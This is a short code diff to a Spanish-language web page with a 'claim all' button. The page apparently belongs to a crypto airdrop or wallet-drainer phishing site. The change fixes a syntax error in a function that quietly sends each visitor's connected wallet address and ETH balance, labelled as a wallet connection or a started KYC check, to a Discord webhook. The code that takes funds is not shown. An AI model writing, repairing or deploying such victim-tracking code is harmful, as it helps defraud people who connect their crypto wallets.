@@ -193,14 +193,13 @@ document.getElementById("claimAll").addEventListener("click", async () => {
     alert("Error al ejecutar el claim: " + error.message);
   }
 });
-
 async function sendToDiscordWebhook(eventType, address, balance) {
   const embed = {
     title: eventType === 'wallet' ? 'Wallet Conectada' : 'KYC Iniciado',
     color: eventType === 'wallet' ? 0x00FF00 : 0xFFA500,
     fields: [
       { name: 'Dirección', value: address },
-      { name: 'Balance', value: ${balance} ETH }
+      { name: 'Balance', value: `${balance} ETH` }
     ],
     timestamp: new Date().toISOString()
   };
@@ -215,5 +214,6 @@ async function sendToDiscordWebhook(eventType, address, balance) {
     console.error("Error enviando a Discord:", error);
   }
 }
+
 
 
